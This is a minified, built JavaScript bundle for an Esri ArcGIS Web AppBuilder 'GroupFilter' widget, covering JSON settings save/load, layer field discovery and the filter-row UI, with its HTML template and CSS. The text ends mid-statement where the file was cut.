// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/GroupFilter/SaveJSON":function(){define("dojo/Evented dojo/_base/declare dojo/Deferred dojo/_base/html dojo/has jimu/utils".split(" "),function(w,v,q,p,u,n){return v([w],{declaredClass:"saveJSON",config:null,constructor:function(e){v.safeMixin(this,e)},_getDownloadUrl:function(e){return window.Blob&&window.URL&&window.URL.createObjectURL?(e=new Blob([e],{type:"text/json"}),URL.createObjectURL(e)):"data:attachment/json;charset\x3dutf-8,"+encodeURIComponent(e)},exportsJson:function(e,
f){f=JSON.stringify(f);var x=new q;try{if(u("ie")&&10>u("ie")){var r=window.top.open("about:blank","_blank");r.document.write("sep\x3d,\r\n"+f);r.document.close();r.document.execCommand("SaveAs",!0,e);r.close();this.savePrompt()}else if(10===u("ie")||this._isIE11()||this._isEdge()){var k=new Blob([f],{type:"text/json"});navigator.msSaveBlob(k,e);this.savePrompt()}else{var h=p.create("a",{href:this._getDownloadUrl(f),target:"_blank",download:e},document.body);if(u("safari")){var n=document.createEvent("MouseEvents");
n.initEvent("click",!0,!0);h.dispatchEvent(n)}else h.click();this.savePrompt();p.destroy(h)}x.resolve()}catch(d){x.reject(d)}return x},_isIE11:function(){return 11===n.has("ie")},_isEdge:function(){return n.has("edge")},savePrompt:function(){this.emit("complete",{})}})})},"widgets/GroupFilter/ReadJSON":function(){define("dojo/Evented dojo/_base/declare dojo/has dojo/_base/lang jimu/utils jimu/dijit/Message".split(" "),function(w,v,q,p,u,n){return v([w],{declaredClass:"readJSON",config:null,jsonFile:null,
constructor:function(e){v.safeMixin(this,e)},checkFileReader:function(){this.supportHTML5()?(console.log("HTML 5 loader"),this._processFiles(this.jsonFile)):this.supportHTML5()||q("safari")||!this.isEnabledFlash()?console.log("no loader"):u.file.loadFileAPI().then(p.hitch(this,function(){console.log("loading FileAPI")}))},_processFiles:function(e){0<e.length&&(e=e[0],-1!==e.name.indexOf(".json")?e&&this.handleJson(e):new n({message:"Not a json file"}))},handleJson:function(e){if(this.supportHTML5()){var f=
new FileReader;f.onload=function(e){return function(){-1<f.result.indexOf("groups")?e.completePrompt(f.result):(new n({message:"json file is Invalid"}),e.errorPrompt("error"))}}(this);f.readAsText(e)}else window.FileAPI.readAsText(e,p.hitch(this,function(f){}))},supportHTML5:function(){return window.File&&window.FileReader&&window.FileList&&window.Blob?!0:!1},supportFileAPI:function(){return q("safari")&&6>q("safari")?!1:window.FileAPI&&window.FileAPI.readAsDataURL?!0:!1},isEnabledFlash:function(){var e=
null;if(document.all)try{e=new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(f){e=null}else navigator.plugins&&0<navigator.plugins.length&&(e=navigator.plugins["Shockwave Flash"]);return!!e},completePrompt:function(e){this.emit("complete",{UserSettings:e})},errorPrompt:function(){this.emit("error",{UserSettings:"error"})}})})},"widgets/GroupFilter/LayersHandler":function(){define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/request".split(" "),
function(w,v,q,p,u,n,e){return v([w],{declaredClass:"LayersHandler",layers:null,layerStore:[],fieldName:null,childList:null,validFieldTypes:"esriFieldTypeInteger esriFieldTypeSmallInteger esriFieldTypeDouble esriFieldTypeSingle esriFieldTypeString esriFieldTypeDate esriFieldTypeGeometry esriFieldTypeOID esriFieldTypeBlob esriFieldTypeGlobalID esriFieldTypeRaster esriFieldTypeGUID esriFieldTypeXML".split(" "),layersOnly:!1,constructor:function(f){v.safeMixin(this,f)},getAllMapLayers:function(){var f=
[],e=new u,r;this.layerStore=[];p.forEach(this.layers,q.hitch(this,function(k){if(!k.featureCollection)if("undefined"===typeof k.originOperLayer||!k.originOperLayer.layerType||"ArcGISFeatureLayer"!==k.originOperLayer.layerType&&"ArcGISImageServiceLayer"!==k.originOperLayer.layerType)if(0<k.newSubLayers.length){if(this.childList=[],"undefined"===typeof k.originOperLayer.layerType||"ArcGISTiledMapServiceLayer"!==k.originOperLayer.layerType)p.forEach(k.layerObject.layerInfos,q.hitch(this,function(h){h=
{label:h.name,id:k.id+"."+h.id,url:k.originOperLayer.url+"/"+h.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:k.layerObject};this.childList.push(h);f.push(this._getLayerInfo(h))})),r={label:k.title,id:k.id,url:k.originOperLayer.url,type:"Service",checked:!1,children:this.childList,layer:k.layerObject},this.layerStore.push(r)}else"ArcGISMapServiceLayer"===k.originOperLayer.layerType&&(this.childList=[],p.forEach(k.layerObject.layerInfos,q.hitch(this,function(h){h={label:h.name,
id:k.id+"."+h.id,url:k.originOperLayer.url+"/"+h.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:k.layerObject};this.childList.push(h);f.push(this._getLayerInfo(h))})),r={label:k.title,id:k.id,url:k.originOperLayer.url,type:"MapService",checked:!1,children:this.childList,layer:k.layerObject},this.layerStore.push(r));else"undefined"===typeof k.originOperLayer.featureCollection&&(r={label:k.title,id:k.id,url:k.url,fieldName:this.fieldName,type:"Feature Layer",checked:!1,children:[],
layer:k.layerObject},f.push(this._getLayerInfo(r)),this.layerStore.push(r))}));n(f).then(q.hitch(this,function(){var f=this._controlComplete();this.emit("complete",f);e.resolve(f)}),q.hitch(this,function(){e.resolve(null)}));return e.promise},_getLayerInfo:function(f){var n=new u;f.url?0===f.url.length?n.resolve():e({url:f.url,content:{f:"json"},callbackParamName:"callback"}).then(q.hitch(this,function(e){if(e.hasOwnProperty("fields")&&!1===this.layersOnly){var k=p.map(e.fields,q.hitch(this,function(h){return{label:h.alias,
id:f.id+"."+h.name,name:h.name,type:"Field",fieldType:h.type,checked:!1}})),k=p.filter(k,q.hitch(this,function(f){return 0<=p.indexOf(this.validFieldTypes,f.fieldType)}));f.children=k}f.geometryType=e.geometryType;f.visible=!0;this.geometryTypes&&!p.some(this.geometryTypes,function(h){if(h===f.geometryType)return!0})&&(f.visible=!1);n.resolve(e)}),function(){n.resolve(null)}):n.resolve();return n.promise},_controlComplete:function(){p.forEach(this.layerStore,function(f){if(f.children&&0<f.children.length){var e=
p.filter(f.children,function(f){return f.hasOwnProperty("visible")?f.visible:!0});f.children=e;0===f.children.length&&(f.visible=!1)}});return this.store={data:{identifier:"id",label:"label",items:p.filter(this.layerStore,function(f){return f.hasOwnProperty("visible")?f.visible:!0})}}}})})},"widgets/GroupFilter/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/GroupFilter/Widget.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"groupContainer" data-dojo-attach-point\x3d"widgetIntro"\x3e\r\n\t\t\x3cdiv class\x3d"group-picker"\x3e\r\n\t\t\t\x3ctable width\x3d"100%" cellspacing\x3d"0" cellpadding\x3d"0"\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"groupHeader"\x3e${nls.labels.selectGroup}\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"saveTD" data-dojo-attach-point\x3d"optionsIcon" id\x3d"saveTD" data-dojo-attach-event\x3d"click:toggleSaveFilter"\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2"\x3e\x3cdiv data-dojo-attach-point\x3d"groupPicker" id\x3d"groupPicker"\x3e\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd colspan\x3d"2" id\x3d"groupDesc" data-dojo-attach-point\x3d"groupDesc"\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv class\x3d"container" data-dojo-attach-point\x3d"filterBlock" id\x3d"filterBlock"\x3e\r\n\t\t\x3cdiv class\x3d"filter-block" data-dojo-attach-point\x3d"filterBlockInner" id\x3d"filterBlockInner"\x3e\r\n\t\t\t\x3ctable id\x3d"tblPredicates" class\x3d"tableFormat" border\x3d0 cellspacing\x3d"0" cellpadding\x3d"0"\x3e\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv class\x3d"saveContainer" data-dojo-attach-point\x3d"saveBlock" id\x3d"saveBlock"\x3e\r\n\t\t\x3cdiv class\x3d"save-block" data-dojo-attach-point\x3d"saveBlockInner" id\x3d"saveBlockInner"\x3e\r\n\t\t\t\x3ctable id\x3d"tblSave" class\x3d"tableFormat" border\x3d0 cellspacing\x3d"0" cellpadding\x3d"0"\x3e\r\n\t\t\t\t\x3ctr class\x3d"rowHeader"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdFirstLabel"\x3e${nls.labels.saveHeading}\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"close-save" data-dojo-attach-event\x3d"click:toggleSaveFilter"\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdData"\x3e\x3cdiv class\x3d"jimu-btn saveFunction" data-dojo-attach-event\x3d"click:saveJsonToFile" \x3e${nls.buttons.save}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr class\x3d"rowHeader"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdLabel"\x3e${nls.labels.uploadHeading}\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr class\x3d"rowHeader"\x3e\r\n\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdData"\x3e\x3cinput type\x3d"file" id\x3d"jsonFileInput" data-dojo-attach-point\x3d"jsonFileInput" data-dojo-attach-event\x3d"change:readJsonToConfig" accept\x3d".json"\x3e\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"loadProgressHeader" id\x3d"tdProgress"\x3e\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\t\x3cbr\x3e\r\n\t\t\t\x3ctable id\x3d"tblSave" class\x3d"tableFormat" border\x3d0 cellspacing\x3d"0" cellpadding\x3d"0"\x3e\r\n\t\t\t\t\x3ctr class\x3d"rowHeader"\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdLabel"\x3e${nls.labels.layerOptionHeading}\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr style\x3d"height:0px; display:none;"\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdData"\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkAppendToDef" data-dojo-props\x3d"value:true,checked:false"/\x3e ${nls.labels.AppendDefHeading}\r\n\t\t\t\t\t\t\x3cselect data-dojo-attach-point\x3d"slAppendChoice" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\t\t\t\t    \x3coption value\x3d"OR"\x3e${nls.inputs.optionOR}\x3c/option\x3e\r\n\t\t\t\t\t\t    \x3coption value\x3d"AND"\x3e${nls.inputs.optionAND}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"tdData"\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkPersistDef" data-dojo-props\x3d"value:true,checked:false"/\x3e ${nls.labels.PersistDefHeading}\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\r\n\t\x3cdiv class\x3d"buttonContainer"\x3e\r\n\t\t\x3ctable class\x3d"buttonContainerTable" border\x3d0\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd class\x3d"filter-add-criteria"\x3e\x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"btnCriteria" data-dojo-attach-event\x3d"click:btnNewRowAction"\x3e${nls.buttons.addCriteria}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3ctable class\x3d"buttonContainerSubtable" border\x3d0\x3e\r\n\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\x3ctd class\x3d"filter-button-apply"\x3e\x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"btnApply" data-dojo-attach-event\x3d"click:setFilterLayerDef"\x3e${nls.buttons.applyCriteria}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\t\x3ctd class\x3d"filter-button-cancel"\x3e\x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"btnReset" data-dojo-attach-event\x3d"click:resetLayerDef"\x3e${nls.buttons.removeCriteria}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\r\n\x3c/div\x3e',
"url:widgets/GroupFilter/css/style.css":'.jimu-widget-map-filter {width:100%; height:100%;}.jimu-widget-map-filter .groupContainer {display: block;}.jimu-widget-map-filter .container {border-color: #e1e1e1; border-top: 3px solid; width: 100%; height: 60%; position:relative; overflow-y: auto; overflow-x: auto; display: block;}.jimu-widget-map-filter .saveContainer {width: 100%; height: 100%; position:absolute; top: 0px; left: 0px; z-index: 999; overflow-y: auto; overflow-x: auto; display: none;}.jimu-widget-map-filter .save-block {position: absolute; left: 5px;}.jimu-widget-map-filter .close-save {position:relative; float: right; content: url("../images/setting_default.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .close-save:after {position:relative; float: right; content: url("../images/setting_default.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .headerTable {width: 100%;}.jimu-widget-map-filter .groupHeader {font-size: 10pt; padding-left: 0px; padding-bottom: 5px; width: 100%;}.jimu-widget-map-filter .saveTD {content: url("../images/setting_disabled.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .saveTD:after {content: url("../images/setting_disabled.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .saveTDClose {content: url("../images/setting_default.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .saveTDClose:after {content: url("../images/setting_default.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .group-picker {padding-bottom: 5px;}.jimu-widget-map-filter .filter-block {position: absolute; left: 0px; top: 5px;}.jimu-widget-map-filter .filter-row {position: relative; width: 100%;}.jimu-widget-map-filter .tableFormat {table-layout: fixed; width:100%;}.jimu-widget-map-filter .rowHeader {color: #000000;}.jimu-widget-map-filter .saveFunction {margin-top: 5px;}.jimu-widget-map-filter .tableRow {background-color: #E3E3E3;}.jimu-widget-map-filter .tdOperatorHide {display: block; width: 75px;}.jimu-widget-map-filter .operatorSelect {}.jimu-widget-map-filter .tdValue {width: 200px; height: 20px; padding-left: 5px;}.jimu-widget-map-filter .userInputNormal {width: 95%;}.jimu-widget-map-filter .tdConjunction {width: 75px;}.jimu-widget-map-filter .conjuncSelect {width: 70px;}.jimu-widget-map-filter .tdRemove {width: 16px; text-align: right;}.jimu-widget-map-filter .tdFirstLabel {text-align: left; padding-left: 5px; padding-top: 5px; padding-bottom: 0px; padding-right: 5px; width: 100%;}.jimu-widget-map-filter .tdLabel {text-align: left; padding-left: 5px; padding-top: 15px; padding-bottom: 2px; padding-right: 5px; width: 100%;}.jimu-widget-map-filter .tdData {text-align: left; padding-left: 5px; padding-top: 5px; padding-bottom: 5px; padding-right: 5px; width: 100%;}.jimu-widget-map-filter .tdUploadData {text-align: left; padding-left: 5px; padding-top: 10px; padding-bottom: 0px; padding-right: 5px; width: 100%;}.jimu-widget-map-filter .tdSave {text-align: right; padding-right: 5px; width: 100%;}.jimu-widget-map-filter .loadProgressHeader {display: none; width: 16px;}.jimu-widget-map-filter .loadProgressShow {content: url("../images/validating.gif"); display: none; width: 16px;}.jimu-widget-map-filter .loadProgressShow:after {content: url("../images/validating.gif"); display: none; width: 16px;}.jimu-widget-map-filter .advModeOffset {content: url("../images/setting_default.png"); padding-right: 10px; cursor: hand; cursor: pointer;}.jimu-widget-map-filter .advModeOffset:after {content: url("../images/setting_default.png"); padding-right: 10px; cursor: hand; cursor: pointer;}.jimu-widget-map-filter .advModeClose {content: url("../images/setting_disabled.png"); cursor: hand; cursor: pointer; width: 16px; height: 16px;}.jimu-widget-map-filter .advModeClose:after {content: url("../images/setting_disabled.png"); cursor: hand; cursor: pointer; width: 16px; height: 16px;}.jimu-widget-map-filter .advModeOpen {content: url(""); cursor: hand; cursor: pointer; width: 16px; height: 16px;}.jimu-widget-map-filter .deleteCell {content: url("../images/delete.png"); width: 16px; height: 16px; cursor: hand; cursor: pointer;}.jimu-widget-map-filter .deleteCell:after {content: url("../images/delete.png"); width: 16px; height: 16px; cursor: hand; cursor: pointer;}.jimu-widget-map-filter .deleteCell:hover {content: url("../images/delete_hover.png"); width: 16px; height: 16px; cursor: hand; cursor: pointer;}.jimu-widget-map-filter .buttonContainer {position: absolute; left: 0px; bottom: 0px; width: 100%;}.jimu-widget-map-filter .buttonContainerTable {width: 100%;}.jimu-widget-map-filter .buttonContainerSubtable {float: right;}.jimu-widget-map-filter .filter-add-criteria {text-align: left;}.jimu-widget-map-filter .filter-button-apply {text-align: right; padding-right: 5px;}.jimu-widget-map-filter .filter-button-cancel {text-align: right;}.jimu-widget-map-filter .criteriaCellSize {width: 90%; vertical-align: top; padding-top: 5px; padding-left: 2px;}.jimu-widget-map-filter .deleteCellSize {width: 20px; text-align: right; vertical-align: top; padding-top: 5px;}.jimu-widget-map-filter .hide-items {display: none;}.jimu-widget-map-filter .operator-class {}.jimu-widget-map-filter .value-class {}',
"*now":function(w){w(['dojo/i18n!*preload*widgets/GroupFilter/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin jimu/BaseWidget dijit jimu/dijit/FilterParameters dojo/dom dojo/dom-construct dojo/dom-class dojo/dom-attr dojo/dom-style dojo/on dojo/query dojo/string dojo/_base/lang dojo/_base/array dojo/date/locale dijit/form/Select dijit/form/TextBox dijit/form/DateTextBox dijit/form/NumberTextBox dijit/registry jimu/LayerInfos/LayerInfos jimu/utils jimu/FilterManager esri/tasks/query esri/tasks/QueryTask esri/geometry/geometryEngine esri/layers/FeatureLayer ./SaveJSON ./ReadJSON ./LayersHandler dojox/html/entities dijit/form/CheckBox".split(" "),function(w,
v,q,p,u,n,e,f,x,r,k,h,G,d,m,y,B,H,I,J,z,K,t,L,C,D,A,M,N,O,P,E){return w([q,v],{baseClass:"jimu-widget-map-filter",layerList:null,msLayersDesc:null,grpSelect:null,groupCounter:0,groupCurrVal:null,defaultDef:null,runTimeConfig:null,useDomain:null,useDate:null,useValue:null,runInitial:!1,graphicsHolder:null,slAppendChoice:null,chkAppendToDef:null,persistOnClose:!0,filterExt:null,dayInMS:86399E3,postCreate:function(){this.inherited(arguments);this.defaultDef=[];this.graphicsHolder=[]},startup:function(){this.inherited(arguments);
this.config.optionsMode&&f.add(this.optionsIcon,"hide-items");""!==this.config.groups[0].defaultVal&&""!==this.config.groups[0].operator&&(this.runInitial=!0);"undefined"!==typeof this.config.webmapAppendMode&&(this.chkAppendToDef.checked=this.config.webmapAppendMode,this.slAppendChoice.value=this.config.slAppendChoice);"undefined"!==typeof this.config.persistOnClose?this.persistOnClose=this.config.persistOnClose:this.config.persistOnClose=this.persistOnClose;this.chkPersistDef.set("checked",this.persistOnClose);
this.createMapLayerList()},btnNewRowAction:function(){var a=this.checkDefaultValue(this.config.groups[0]),b=this.checkDefaultOperator(this.config.groups[0]);this.createNewRow({operator:b,value:a,conjunc:"OR",state:"new"})},createMapLayerList:function(){K.getInstance(this.map,this.map.itemInfo).then(d.hitch(this,function(a){a._layerInfos&&0<a._layerInfos.length&&(this.layerList=a._layerInfos,this._pullMapServiceFields(a._layerInfos),m.forEach(this.layerList,d.hitch(this,function(a){"ArcGISTiledMapServiceLayer"!==
a.originOperLayer.layerType&&"undefined"===typeof a.originOperLayer.featureCollection&&("undefined"!==typeof a.layerObject._defnExpr?this.defaultDef.push({layer:a.id,definition:a.layerObject._defnExpr,visible:a.layerObject.visible}):"undefined"!==typeof a.layerObject.defaultDefinitionExpression&&"function"===typeof a.layerObject.getDefinitionExpression()?this.defaultDef.push({layer:a.id,definition:a.layerObject.getDefinitionExpression(),visible:a.layerObject.visible}):"undefined"!==typeof a.layerObject.layerDefinitions?
this.defaultDef.push({layer:a.id,definition:a.layerObject.layerDefinitions,visible:a._visible}):this.defaultDef.push({layer:a.id,definition:"",visible:a.layerObject.visible}))})))}))},_pullMapServiceFields:function(a){this.msLayersDesc=[];a=new P({layers:a});this.own(k(a,"complete",d.hitch(this,function(a){m.forEach(a.data.items,d.hitch(this,function(a){0<a.children.length&&this.msLayersDesc.push(a)}));this.createGroupSelection()})));this.own(k(a,"error",d.hitch(this,function(){console.log("error")})));
a.getAllMapLayers()},checkDomainUse:function(a){this.useValue=this.useDomain=null;m.forEach(this.config.groups,d.hitch(this,function(b){b.name===a.group&&m.forEach(b.layers,d.hitch(this,function(a){m.forEach(this.layerList,d.hitch(this,function(b){"undefined"!==typeof b.newSubLayers&&(0<b.newSubLayers.length?m.forEach(this.msLayersDesc,d.hitch(this,function(b){m.forEach(b.children,d.hitch(this,function(b){b.id===a.layer&&m.forEach(b.children,d.hitch(this,function(b){b.name===a.field&&""!==a.useDomain&&
(this.useValue=a.useDomain)}))}))})):a.layer===b.id&&m.forEach(b.layerObject.fields,d.hitch(this,function(b){b.name===a.field&&""!==a.useDomain&&(this.useValue=a.useDomain,"undefined"!==typeof b.domain&&(this.useDomain=b.domain))})))}))}))}))},checkDateUse:function(a){this.useDate=null;m.forEach(this.config.groups,d.hitch(this,function(b){b.name===a.group&&m.forEach(b.layers,d.hitch(this,function(a){m.forEach(this.layerList,d.hitch(this,function(b){a.layer===b.id&&m.forEach(b.layerObject.fields,d.hitch(this,
function(b){b.name===a.field&&0<=b.type.indexOf("Date")&&(this.useDate=!0)}))}))}))}))},createGroupSelection:function(){var a=[],b="";m.forEach(this.config.groups,d.hitch(this,function(b){var c={};c.value=b.name;c.label=b.name;c.selected=!1;a.push(c)}));this.grpSelect=(new B({options:a})).placeAt(this.groupPicker);this.grpSelect.startup();this.own(k(this.grpSelect,"change",d.hitch(this,function(a){this.resetLayerDef({group:this.groupCurrVal});this.removeAllRows();this.checkDomainUse({group:a});this.checkDateUse({group:a});
this.reconstructRows(a);this.updateGroupDesc(a);this.groupCurrVal=a;setTimeout(d.hitch(this,this.setFilterLayerDef),1E3)})));this.checkDomainUse({group:this.grpSelect.value});this.checkDateUse({group:this.grpSelect.value});this.groupCurrVal=this.grpSelect.value;"undefined"!==typeof this.config.groups[0]&&(b=this.config.groups[0].desc,this.groupDesc.innerHTML=b);var b=this.checkDefaultValue(this.config.groups[0]),c=this.checkDefaultOperator(this.config.groups[0]);this.createNewRow({operator:c,value:b,
conjunc:"OR",state:"new"})},createNewRow:function(a){var b=n.byId("tblPredicates"),c;"new"===a.state&&(1<b.rows.length?(c=b.rows[b.rows.length-1].cells[0].firstChild,c=c.rows[2].cells[0],this.createConditionSelection(c,a)):1===b.rows.length&&(c=b.rows[b.rows.length-1].cells[0].firstChild,c=c.rows[2].cells[0],this.createConditionSelection(c,a)));c=b.insertRow(-1);var g=c.insertCell(0),k=c.insertCell(1);f.add(g,"criteriaCellSize");f.add(k,"deleteCellSize");var l=e.create("table",{border:"0",width:"100%"},
g),g=l.insertRow(-1),m=g.insertCell(0),F=l.insertRow(-1).insertCell(0),l=l.insertRow(-1).insertCell(0);r.set(l,{paddingLeft:"3px",paddingRight:"3px"});f.add(g,"operator-class");this.colorRows();this.createOperatorSelection(m,a);this.removeTableRow(k,c,b.rows.length);this.createInputFilter(F,a);this.resize();this.config.simpleMode&&(f.add(this.btnCriteria,"hide-items"),f.add(g,"hide-items"),h(".container").style("borderTop","0px"),r.set(F,{paddingLeft:"0px",paddingRight:"0px"}));"reload"===a.state?
""!==a.conjunc&&(c=b.rows[b.rows.length-1].cells[0].firstChild,c=c.rows[2].cells[0],this.createConditionSelection(c,a)):this.runInitial&&(this.runInitial=!1,setTimeout(d.hitch(this,this.setFilterLayerDef),1E3))},colorRows:function(){var a=n.byId("tblPredicates").rows;m.forEach(a,function(a,c){0===c%2?f.remove(a,"tableRow"):f.add(a,"tableRow")})},createOperatorSelection:function(a,b){a=(new B({options:[{value:"\x3d",label:this.nls.inputs.optionEQUAL},{value:"\x3c\x3e",label:this.nls.inputs.optionNOTEQUAL},
{value:"\x3e",label:this.nls.inputs.optionGREATERTHAN},{value:"\x3e\x3d",label:this.nls.inputs.optionGREATERTHANEQUAL},{value:"\x3c",label:this.nls.inputs.optionLESSTHAN},{value:"\x3c\x3d",label:this.nls.inputs.optionLESSTHANEQUAL},{value:"START",label:this.nls.inputs.optionSTART},{value:"END",label:this.nls.inputs.optionEND},{value:"LIKE",label:this.nls.inputs.optionLIKE},{value:"NOT LIKE",label:this.nls.inputs.optionNOTLIKE},{value:"d\x3c\x3d",label:this.nls.inputs.optionONORBEFORE},{value:"d\x3e\x3d",
label:this.nls.inputs.optionONORAFTER}],"class":"operatorSelect"})).placeAt(a);a.startup();a.set("value",E.decode(b.operator));this.own(k(a,"click",d.hitch(this,function(){})));this.own(k(a,"change",d.hitch(this,function(){})))},createInputFilter:function(a,b){e.empty(a);if(null!==this.useDomain)if("undefined"!==typeof this.useDomain.codedValues){var c=new u;c.placeAt(a);c.startup();this.createValueList(b,c)}else c="",""!==b.value&&(c=Number(b.value)),(new J({value:c,placeHolder:G.substitute(this.nls.inputs.textboxNumber,
{0:this.useDomain.minValue,1:this.useDomain.maxValue}),"class":"userInputNormal",constraints:{min:this.useDomain.minValue,max:this.useDomain.maxValue}})).placeAt(a).startup(),this.formatSpacing(a);else!0===this.useValue?(c=new u,c.placeAt(a),c.startup(),this.createValueList(b,c)):(!0===this.useDate?(b=y.format(""!==b.value?new Date(b.value):new Date,{selector:"date",fullYear:!0}),c=(new I({value:b,placeHolder:b,"class":"userInputNormal"})).placeAt(a),c.startup(),c.set("displayedValue",b)):(new H({value:b.value,
placeHolder:this.nls.inputs.textboxText,"class":"userInputNormal"})).placeAt(a).startup(),this.formatSpacing(a))},createValueList:function(a,b){var c={},g=[],f="";m.forEach(this.config.groups,d.hitch(this,function(l){l.name===this.grpSelect.value&&m.forEach(l.layers,d.hitch(this,function(l){f="";m.forEach(this.layerList,d.hitch(this,function(e){0<e.newSubLayers.length?m.forEach(this.msLayersDesc,d.hitch(this,function(e){m.forEach(e.children,d.hitch(this,function(e){if(e.id===l.layer){if(f!==e.id&&
!0===l.useDomain){var h=new M(e.url);this.own(k(h,"load",d.hitch(this,function(){this._callFilterDijit(l,a,e.url,h,g,c,b)})))}f=e.id}}))})):l.layer===e.id&&!0===l.useDomain&&this._callFilterDijit(l,a,e.layerObject.url,e.layerObject,g,c,b)}))}))}))},_callFilterDijit:function(a,b,c,g,e,l,f){var d={fieldObj:{}};d.fieldObj.name=a.field;d.fieldObj.label=a.field;d.fieldObj.shortType=a.dataType.replace("esriFieldType","").toLowerCase();if("guid"!==d.fieldObj.shortType||"globalid"!==d.fieldObj.shortType)d.fieldObj.shortType=
"string";"date"!==d.fieldObj.shortType&&"string"!==d.fieldObj.shortType&&(d.fieldObj.shortType="number");d.fieldObj.type=a.dataType;d.operator=d.fieldObj.shortType+"OperatorIs";d.valueObj={};d.valueObj.isValid=!0;d.valueObj.type="unique";-1<a.dataType.indexOf("Integer")||-1<a.dataType.indexOf("Double")||-1<a.dataType.indexOf("Short")?d.valueObj.value=this.useDomain?Number(b.value):b.value:d.valueObj.value=b.value;d.interactiveObj={};d.interactiveObj.prompt="";d.interactiveObj.hint="";d.caseSensitive=
